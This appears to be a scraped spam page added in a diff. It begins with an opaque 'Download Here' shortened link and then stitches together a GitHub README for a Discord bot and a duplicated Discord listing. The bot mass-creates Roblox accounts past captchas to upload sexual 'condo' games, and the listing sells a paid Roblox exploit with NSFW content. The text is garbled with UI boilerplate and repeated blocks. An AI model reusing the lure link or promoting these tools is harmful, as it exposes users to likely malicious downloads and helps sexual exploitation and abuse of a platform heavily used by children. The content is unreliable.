@@ -1,0 +1,157 @@
+Download Here ---> https://tinyurl.com/ycx3x5fn?id=352733
+
+
+
+Name already in use
+
+
+A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
+
+
+ discord-roblox-condo-bot / README.md 
+
+
+This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
+
+
+
+
+  
+Open with Desktop
+
+  
+View raw
+
+  
+Copy raw contents Copy raw contents Copy raw contents
+
+
+
+(3/4/22 edit: it seems that roblox patched most of the stuff here, kudos to them)
+
+
+a discord bot that uploads roblox condos fully open sourced written in js
+
+
+(ugly, old, spaghetti and broken)
+
+
+
+  
+bot sends user captcha
+
+  
+user solves captcha and bot creates account roblox
+
+  
+bot uses roblox account and uploads a module
+
+  
+bot creates a random script and a random place
+
+  
+bot updates starter place with the random place with all random shit
+
+  
+bot sends place to user
+
+  
+user gets lego sex
+
+
+
+
+set a enviroment key named "TOKEN" with your discord bot token
+
+
+once you have all changed and shit just do this command "m?start #channel-name" so the bot sends the initial embed with the buttons and shit
+
+
+edit shit in ./general/maps.json for changing the list of games in the embed and also add your map module within ./general/modules_rbxmx
+
+
+it's easy to understand how to add maps also i left there some old maps i don't use anymore as examples
+
+
+
+  
+embeds
+
+  
+buttons
+
+  
+fixed captcha shit
+
+  
+games lasts for 5 seconds
+
+  
+you can change name and max player count within the bot
+
+  
+it's hard to customize
+
+  
+some roblox place scrubber that i ported from lua to javascript (if i'm not too lazy to search i'll add credits later to the original dude)
+
+  
+uhhh idk, spaghetti code
+
+
+
+
+no, fix it yourself and learn how to setup properly, there are stuff that is broken and i don't want to document it so go ahead and do your work trying to read all this bad and old code.
+
+
+can i fix it and do a fork of this
+
+
+why is everything in spanish?
+
+
+this was made for an spanish condo server but since i left the server i don't want this bot to be private anymore, so go ahead and do whatever you want with it
+
+
+any hint on how to change the embeds and shit
+
+
+./index.js and ./modulardos/main.js has some embed stuff in it so yeah, also the ./bot-configs.json has some embed shit in there but only for errors sooo yeah also you can enable logs when a user gets an error and a user creates a game with the bot
+
+
+anyways have fun trying to figure how to make this shit work also credits to roblox-thot for the fix on the captcha shit patch
+
+
+AUDIO HUB
+
+
+?THIS SERVER IS ALL ABOUT AUDIO HUB. A EXPLOIT ON ROBLOX WHICH IS PAID, THAT HAS OVER 100+ RARE IDS, 
+NICE GUI. ALOT OF SETTINGS. WE WILL BE ADDING ANTI LOG AND LOG? 
+?SERVER WITH 28 MEMBERS.? 
+?5 PURCHASES?
+
+
+In this server we offer you, audio makers, music channels, friends to make. Exploits to use. ADVERTISING COMING SOON. 
+?PLEASE TAKE NOTICE THIS SERVER HAS NSFW? 
+EXPLOIT IS 1 USD/POUNDS. 
+(PAYPAL) OR 80 ROBUX T-SHIRT. 
+https://discord.gg/PxMSnMQr
+
+
+About Server
+
+
+?THIS SERVER IS ALL ABOUT AUDIO HUB. A EXPLOIT ON ROBLOX WHICH IS PAID, THAT HAS OVER 100+ RARE IDS, 
+NICE GUI. ALOT OF SETTINGS. WE WILL BE ADDING ANTI LOG AND LOG? 
+?SERVER WITH 28 MEMBERS.? 
+?5 PURCHASES?
+
+
+In this server we offer you, audio makers, music channels, friends to make. Exploits to use. ADVERTISING COMING SOON. 
+?PLEASE TAKE NOTICE THIS SERVER HAS NSFW? 
+EXPLOIT IS 1 USD/POUNDS. 
+(PAYPAL) OR 80 ROBUX T-SHIRT. 
+https://discord.gg/PxMSnMQr
+
+
+Sorry, we tried hitting it with a wrench, but couldn't get an invite out of it. Try back later or check out these other great servers you might love ❤️
